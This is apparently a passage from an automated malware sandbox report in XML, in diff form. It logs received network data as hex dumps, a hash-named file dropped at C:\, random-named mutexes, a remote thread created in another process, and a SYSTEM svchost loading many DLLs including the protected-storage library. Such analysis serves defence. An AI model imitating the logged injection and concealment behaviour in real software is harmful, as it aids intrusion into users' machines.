+<dump_line offset="&#x24;0060" dump="6A 8F 7A E2 33 70 44 A2 B1 78 ED DC 38 4A 7F D8 " ascii="j.z.3pD..x..8J&#x7F;."/>
+<dump_line offset="&#x24;0070" dump="B5 97 57 DD DA 12 85 6D 3F B5 15 83 2C D8 08 8D " ascii="..W....m&#x3F;...,..."/>
+<dump_line offset="&#x24;0080" dump="97 08 9E 52 EB EB 00 F9 07 FC 6A 74 8A 5C 43 28 " ascii="...R......jt.\C&#x28;"/>
+<dump_line offset="&#x24;0090" dump="92 A3 C0 5E F2 EA 6F DD 53 C2 F4 DF B6 C3 F3 BD " ascii="...&#x5E;..o.S......."/>
+<dump_line offset="&#x24;00A0" dump="B6 0B F3 98 B7 ED C2 2E 49 9D A2 14 A5 2A 40 6B " ascii="........I....&#x2A;&#x40;k"/>
+<dump_line offset="&#x24;00B0" dump="D0 BA 87 62 53 03 42 52 AB 04 F9 B6 C0 AB 99 C9 " ascii="...bS.BR........"/>
+<dump_line offset="&#x24;00C0" dump="13 F1 A0 A3 BD BD 53 D0 5C 8B 54 98 C3 C9 FB 95 " ascii="......S.\.T....."/>
+<dump_line offset="&#x24;00D0" dump="FF 38 6A 2A CF 55 88 3B 75 67 A8 90 6C 0E 30 93 " ascii=".8j&#x2A;.U.;ug..l.0."/>
+<dump_line offset="&#x24;00E0" dump="7F 62 18 C4 BE 8A 3F A1 89 7C 49 32 D5 D7 14 18 " ascii="&#x7F;b....&#x3F;..&#x7C;I2...."/>
+<dump_line offset="&#x24;00F0" dump="68 C8 DB E7 35 07 A0 F2 AF D0 7E FA 26 4F C5 49 " ascii="h...5.....&#x7E;.&#x26;O.I"/>
+<trimmed_bytes count="13432"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="12884" successful="1">
+<dump_line offset="&#x24;0000" dump="4B AA 65 54 D5 D2 CE 24 A1 58 51 D5 CC 9D 53 30 " ascii="K.eT...&#x24;.XQ...S0"/>
+<dump_line offset="&#x24;0010" dump="00 A8 81 91 8C BF 11 29 49 8E 0A 48 DA 0B 48 FD " ascii=".......&#x29;I..H..H."/>
+<dump_line offset="&#x24;0020" dump="2B 39 BC 92 6E CF 13 7A DD 7E B7 20 FC E3 F1 D9 " ascii="&#x2B;9..n..z.&#x7E;. ...."/>
+<dump_line offset="&#x24;0030" dump="3D B7 43 D5 BD 48 95 1A 45 14 87 DF 0A EB DA D1 " ascii="=.C..H..E......."/>
+<dump_line offset="&#x24;0040" dump="33 B7 6D 4B 43 8B CB 25 B9 12 3C 38 1B B7 22 4A " ascii="3.mKC..&#x25;..&#x3C;8..&#x22;J"/>
+<dump_line offset="&#x24;0050" dump="82 12 39 07 33 D3 DD DB 04 5B 11 37 5A 31 D7 58 " ascii="..9.3....[.7Z1.X"/>
+<dump_line offset="&#x24;0060" dump="55 6A FC 15 35 44 69 F5 49 DA 35 EC 03 1B BA 29 " ascii="Uj..5Di.I.5....&#x29;"/>
+<dump_line offset="&#x24;0070" dump="48 C3 65 61 80 42 4A F8 0E 33 DC F3 58 5F EE 87 " ascii="H.ea.BJ..3..X_.."/>
+<dump_line offset="&#x24;0080" dump="8B 75 2F 64 DE A1 6F 86 BE 43 3E D0 61 F6 22 34 " ascii=".u/d..o..C&#x3E;.a.&#x22;4"/>
+<dump_line offset="&#x24;0090" dump="40 6A 4F 01 F4 6D FE 95 C3 1A A5 09 37 1C 1E B0 " ascii="&#x40;jO..m......7..."/>
+<dump_line offset="&#x24;00A0" dump="27 C5 7B F0 F3 B8 8F B8 F6 39 26 A3 EB 74 98 28 " ascii="&#x27;.&#x7B;......9&#x26;..t.&#x28;"/>
+<dump_line offset="&#x24;00B0" dump="FB C0 77 CE 0E 25 26 82 12 8A 8C 8A DA 83 AF 1E " ascii="..w..&#x25;&#x26;........."/>
+<dump_line offset="&#x24;00C0" dump="01 2D CC 79 EF 3C 2B FB 20 5D 4B 8F 75 BB 27 F8 " ascii=".-.y.&#x3C;&#x2B;. ]K.u.&#x27;."/>
+<dump_line offset="&#x24;00D0" dump="EE 69 1D F0 2F 7E 74 AC 5B 19 FE FA B4 4E 68 76 " ascii=".i../&#x7E;t.[....Nhv"/>
+<dump_line offset="&#x24;00E0" dump="6B F9 99 DF 95 9A E4 DB A6 4E AD FD 2F 4E DE 76 " ascii="k........N../N.v"/>
+<dump_line offset="&#x24;00F0" dump="60 63 C6 CF EA CA DB 89 70 89 7D BA 24 C7 C5 26 " ascii="&#x60;c......p.&#x7D;.&#x24;..&#x26;"/>
+<trimmed_bytes count="12628"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<com_create_instance inprocserver32="&#x25;SystemRoot&#x25;\system32\msxml3.dll" progid="Microsoft.XMLDOM.1.0" clsid="&#x7B;2933BF90-7B36-11D2-B20E-00C04F983E60&#x7D;" interfaceid="&#x7B;2933BF81-7B36-11D2-B20E-00C04F983E60&#x7D;"/>
+<create_open_file filetype="file" srcfile="\Device\Tcp6" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\NetBT_Tcpip_&#x7B;5D19E473-BE30-416B-B5C7-D8A091C41D2F&#x7D;" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\Tcp6" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_open_file filetype="file" srcfile="\Device\NetBT_Tcpip_&#x7B;5D19E473-BE30-416B-B5C7-D8A091C41D2F&#x7D;" srcfile_hash="hash_error" creationdistribution="OPEN_ALWAYS" desiredaccess="FILE_ANY_ACCESS FILE_READ_ACCESS FILE_READ_DATA FILE_LIST_DIRECTORY FILE_WRITE_ACCESS FILE_WRITE_DATA FILE_ADD_FILE" shareaccess="FILE_SHARE_READ FILE_SHARE_WRITE" flags="FILE_ATTRIBUTE_NORMAL SECURITY_ANONYMOUS"/>
+<create_file filetype="file" srcfile="c:\8bb601599f35aac13fb78a3fe64522dddat" srcfile_hash="hash_error" creationdistribution="CREATE_ALWAYS" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<open_file filetype="file" srcfile="c:\8bb601599f35aac13fb78a3fe64522dd" srcfile_hash="hash_error" creationdistribution="OPEN_EXISTING" desiredaccess="FILE_ANY_ACCESS" shareaccess="FILE_SHARE_READ" flags="SECURITY_ANONYMOUS"/>
+<sleep milliseconds="0"/>
+</all_section>
+</thread>
+<thread tid="2936">
+<all_section>
+<sleep milliseconds="60000"/>
+</all_section>
+</thread>
+<thread tid="2932">
+<all_section>
+<create_thread targetpid="2568" threadid="2940" address="&#x24;77E56C7D" parameteraddress="&#x24;00559600"/>
+</all_section>
+</thread>
+<thread tid="2948">
+<all_section>
+<get_system_directory/>
+<get_username tokenhandle="0"/>
+<create_mutex name="Local\7A4EC452" owned="0"/>
+<create_mutex name="Local\767C3EAE" owned="0"/>
+<create_mutex name="Local\8DAA0C4C" owned="0"/>
+<sleep milliseconds="500"/>
+<create_process apifunction="CreateProcessA" successful="0"/>
+<get_system_directory/>
+<load_dll filename="C:\WINDOWS\system32\MSCTF.dll" successful="1" address="&#x24;746A0000" end_address="&#x24;746EC000" size="311296" filename_hash="3c5a241879c49efae60e7d20c81195c0008fc317"/>
+</all_section>
+</thread>
+</process>
+<process index="3" pid="956" filename="C:\WINDOWS\system32\svchost.exe" filename_hash="49083ae3725a0488e0a8fbbe1335c745f70c4667" filesize="14336" md5="4fbc75b74479c7a6f829e0ca19df3366" sha1="97c7c354c12b89c797740b35ed81879be58f3deb" username="SYSTEM" parentindex="0" starttime="00:09.234" terminationtime="02:01.234" startreason="DCOMService" terminationreason="Timeout" executionstatus="OK">
+<thread tid="2736">
+<all_section>
+<load_image filename="C:\WINDOWS\system32\svchost.exe" successful="1" address="&#x24;1000000" end_address="&#x24;1006000" size="24576" filename_hash="49083ae3725a0488e0a8fbbe1335c745f70c4667"/>
+<load_dll filename="C:\WINDOWS\system32\ntdll.dll" successful="1" address="&#x24;7C910000" end_address="&#x24;7C9C9000" size="757760" filename_hash="e753d19a2e3b98b2b3b8f02f276092096d10f22d"/>
+<load_dll filename="C:\WINDOWS\system32\kernel32.dll" successful="1" address="&#x24;7C800000" end_address="&#x24;7C908000" size="1081344" filename_hash="c88d57cc99f75cd928b47b6e444231f26670138f"/>
+<load_dll filename="C:\WINDOWS\system32\ADVAPI32.dll" successful="1" address="&#x24;77DA0000" end_address="&#x24;77E4A000" size="696320" filename_hash="ea2e9bac1789b53d7efcd675a63f4a2b44898439"/>
+<load_dll filename="C:\WINDOWS\system32\RPCRT4.dll" successful="1" address="&#x24;77E50000" end_address="&#x24;77EE2000" size="598016" filename_hash="f3bb6474ec18ee9cccc02ef44510a78b42058a41"/>
+<load_dll filename="C:\WINDOWS\system32\Secur32.dll" successful="1" address="&#x24;77FC0000" end_address="&#x24;77FD1000" size="69632" filename_hash="31166d1e35a911a082149f5efac2dac228109615"/>
+<load_dll filename="C:\WINDOWS\system32\ShimEng.dll" successful="1" address="&#x24;5CF00000" end_address="&#x24;5CF26000" size="155648" filename_hash="2ab219118ae324684eb7aaaf72eb4d9360ade81f"/>
+<load_dll filename="C:\WINDOWS\AppPatch\AcGenral.DLL" successful="1" address="&#x24;6FD90000" end_address="&#x24;6FF5A000" size="1875968" filename_hash="d28c378f459fafa7367649554b729a80b3924aad"/>
+<load_dll filename="C:\WINDOWS\system32\USER32.dll" successful="1" address="&#x24;7E360000" end_address="&#x24;7E3F1000" size="593920" filename_hash="08fe9ff1fe9b8fd237adedb10d65fb0447b91fe5"/>
+<load_dll filename="C:\WINDOWS\system32\GDI32.dll" successful="1" address="&#x24;77EF0000" end_address="&#x24;77F39000" size="299008" filename_hash="0f37018f672c7635691f7317ade3c5a63904ec96"/>
+<load_dll filename="C:\WINDOWS\system32\WINMM.dll" successful="1" address="&#x24;76AF0000" end_address="&#x24;76B1E000" size="188416" filename_hash="51f42782acdc790e4cabf402d71ef0fe24f9ad1b"/>
+<load_dll filename="C:\WINDOWS\system32\ole32.dll" successful="1" address="&#x24;774B0000" end_address="&#x24;775ED000" size="1298432" filename_hash="c7753525d5276ab92a01a8a3c39cfb5269da7f98"/>
+<load_dll filename="C:\WINDOWS\system32\msvcrt.dll" successful="1" address="&#x24;77BE0000" end_address="&#x24;77C38000" size="360448" filename_hash="70d5f97088cc9348bb9d10098af0738a696b96de"/>
+<load_dll filename="C:\WINDOWS\system32\OLEAUT32.dll" successful="1" address="&#x24;770F0000" end_address="&#x24;7717B000" size="569344" filename_hash="3168a173d177f470928b468db777640861dcb32e"/>
+<load_dll filename="C:\WINDOWS\system32\MSACM32.dll" successful="1" address="&#x24;77BB0000" end_address="&#x24;77BC5000" size="86016" filename_hash="9be8c8a0ce2316feff5783efbe259bb1f6334a63"/>
+<load_dll filename="C:\WINDOWS\system32\VERSION.dll" successful="1" address="&#x24;77BD0000" end_address="&#x24;77BD8000" size="32768" filename_hash="adf263b658136ccb3cde72d0e6dd634c5a5e5143"/>
+<load_dll filename="C:\WINDOWS\system32\SHELL32.dll" successful="1" address="&#x24;7E670000" end_address="&#x24;7EE91000" size="8523776" filename_hash="bbe9d57955e5d348e664b72faf331a7b9d722d0c"/>
+<load_dll filename="C:\WINDOWS\system32\SHLWAPI.dll" successful="1" address="&#x24;77F40000" end_address="&#x24;77FB6000" size="483328" filename_hash="a9245beec2e139b31cd3b65e0f0e4804c030e639"/>
+<load_dll filename="C:\WINDOWS\system32\USERENV.dll" successful="1" address="&#x24;76620000" end_address="&#x24;766D6000" size="745472" filename_hash="c7264e1fe77ea0e6d615077dd7cc6cc06aaa02cd"/>
+<load_dll filename="C:\WINDOWS\system32\UxTheme.dll" successful="1" address="&#x24;5B0F0000" end_address="&#x24;5B128000" size="229376" filename_hash="16c4d24a172bfbc67f488d6b4086b9e10f8eaf4b"/>
+<load_dll filename="C:\WINDOWS\system32\IMM32.DLL" successful="1" address="&#x24;76330000" end_address="&#x24;7634D000" size="118784" filename_hash="f9be7678080084bc3cb48d0cb64bba9ba98800f1"/>
+<load_dll filename="C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\" successful="1" address="&#x24;773A0000" end_address="&#x24;774A3000" size="1060864" filename_hash="hash_error"/>
+<load_dll filename="C:\WINDOWS\system32\comctl32.dll" successful="1" address="&#x24;5D450000" end_address="&#x24;5D4EA000" size="630784" filename_hash="ba126572bcb4ac594a3c37e2ac86db40b173878d"/>
+<load_dll filename="C:\WINDOWS\system32\NTMARTA.DLL" successful="1" address="&#x24;77660000" end_address="&#x24;77681000" size="135168" filename_hash="7e2ea4d88645138e5edb646157fd702c347bb53a"/>
+<load_dll filename="C:\WINDOWS\system32\SAMLIB.dll" successful="1" address="&#x24;71B70000" end_address="&#x24;71B83000" size="77824" filename_hash="a1d75237cedc30a45117ba1c2040ddfd9f7bb667"/>
+<load_dll filename="C:\WINDOWS\system32\WLDAP32.dll" successful="1" address="&#x24;76F20000" end_address="&#x24;76F4D000" size="184320" filename_hash="03269df70bc4ff939f87ef528f8a5fcf2a708624"/>
+<load_dll filename="c:\windows\system32\rpcss.dll" successful="1" address="&#x24;76A30000" end_address="&#x24;76A94000" size="409600" filename_hash="7391155a9976797c2072e013fa3c38197b268de7"/>
+<load_dll filename="c:\windows\system32\WS2_32.dll" successful="1" address="&#x24;71A10000" end_address="&#x24;71A27000" size="94208" filename_hash="7cf3366c68e402eb3678046fe97651a586044560"/>
+<load_dll filename="c:\windows\system32\WS2HELP.dll" successful="1" address="&#x24;71A00000" end_address="&#x24;71A08000" size="32768" filename_hash="317cc14a94fcf3d10749efbcab330b97f516fffb"/>
+<load_dll filename="C:\WINDOWS\system32\xpsp2res.dll" successful="1" address="&#x24;630000" end_address="&#x24;909000" size="2985984" filename_hash="55401355585fac03b5d6991af85abf8db8fc9042"/>
+<load_dll filename="C:\WINDOWS\system32\CLBCATQ.DLL" successful="1" address="&#x24;76F90000" end_address="&#x24;7700F000" size="520192" filename_hash="bd0f1633a7d858f27d3fa2bad744b766a1533490"/>
+<load_dll filename="C:\WINDOWS\system32\COMRes.dll" successful="1" address="&#x24;77010000" end_address="&#x24;770E3000" size="864256" filename_hash="eda8c030913d048cda82aeb6066be39e005ce0f1"/>
+<load_dll filename="c:\windows\system32\termsrv.dll" successful="1" address="&#x24;761D0000" end_address="&#x24;76224000" size="344064" filename_hash="86773aed393573d4bd59481185910bbaaf85790f"/>
+<load_dll filename="c:\windows\system32\ICAAPI.dll" successful="1" address="&#x24;74EF0000" end_address="&#x24;74EF6000" size="24576" filename_hash="166e7e5c0064c63fb4516303b879d1c83b69cf2a"/>
+<load_dll filename="c:\windows\system32\SETUPAPI.dll" successful="1" address="&#x24;778F0000" end_address="&#x24;779E4000" size="999424" filename_hash="8109df4e050264532bb5757e9da4ae12e29b800f"/>
+<load_dll filename="C:\WINDOWS\system32\WINTRUST.dll" successful="1" address="&#x24;76BF0000" end_address="&#x24;76C1E000" size="188416" filename_hash="7bda19c92848a811077f780f569c0593d14b2a92"/>
+<load_dll filename="C:\WINDOWS\system32\CRYPT32.dll" successful="1" address="&#x24;77A50000" end_address="&#x24;77AE6000" size="614400" filename_hash="3127dbe44b75c673c24f9ad63675ff91cd9c6321"/>
+<load_dll filename="C:\WINDOWS\system32\MSASN1.dll" successful="1" address="&#x24;77AF0000" end_address="&#x24;77B02000" size="73728" filename_hash="e3b7e1519f060e76b7e5579c1974e6260bcdb324"/>
+<load_dll filename="C:\WINDOWS\system32\IMAGEHLP.dll" successful="1" address="&#x24;76C50000" end_address="&#x24;76C78000" size="163840" filename_hash="2eaa144578f2beb69da027ca0e15445c98a95607"/>
+<load_dll filename="c:\windows\system32\AUTHZ.dll" successful="1" address="&#x24;77690000" end_address="&#x24;776A2000" size="73728" filename_hash="36977fd1a696a3c3b974d2147d23425f7b0e6bec"/>
+<load_dll filename="c:\windows\system32\mstlsapi.dll" successful="1" address="&#x24;75090000" end_address="&#x24;750AF000" size="126976" filename_hash="a88f24cb797bb85aba9ea841103faae3677188a7"/>
+<load_dll filename="c:\windows\system32\ACTIVEDS.dll" successful="1" address="&#x24;77C90000" end_address="&#x24;77CC2000" size="204800" filename_hash="71dde7dea4019ab631fe85a31149a494363b7bdc"/>
+<load_dll filename="c:\windows\system32\adsldpc.dll" successful="1" address="&#x24;76DD0000" end_address="&#x24;76DF5000" size="151552" filename_hash="1e272578a29b1c2ed7a013266ca50343a560fa2d"/>
+<load_dll filename="C:\WINDOWS\system32\NETAPI32.dll" successful="1" address="&#x24;597D0000" end_address="&#x24;59825000" size="348160" filename_hash="5e935f90226ff224936edf449f925b647b535917"/>
+<load_dll filename="c:\windows\system32\ATL.DLL" successful="1" address="&#x24;76AD0000" end_address="&#x24;76AE1000" size="69632" filename_hash="59cb82f432d529da3e81b030b2365c22a95fd35a"/>
+<load_dll filename="C:\WINDOWS\system32\REGAPI.dll" successful="1" address="&#x24;76B70000" end_address="&#x24;76B7F000" size="61440" filename_hash="0b43cc40011a36366d3490973e82bcd162bb93da"/>
+<load_dll filename="C:\WINDOWS\system32\rsaenh.dll" successful="1" address="&#x24;68000000" end_address="&#x24;68036000" size="221184" filename_hash="8e8dd9db03ed502d915dee9e4f9fd3f10593e27c"/>
+<load_dll filename="C:\WINDOWS\system32\Apphelp.dll" successful="1" address="&#x24;77B10000" end_address="&#x24;77B32000" size="139264" filename_hash="016ea16586e3c27f4bd43341ba906187a416afe0"/>
+<load_dll filename="C:\WINDOWS\system32\pstorec.dll" successful="1" address="&#x24;5E490000" end_address="&#x24;5E49D000" size="53248" filename_hash="8ae378a352c4a13516bf1fe5a8615d8893d2ff2d"/>
+</all_section>
+</thread>
+</process>
+</processes>
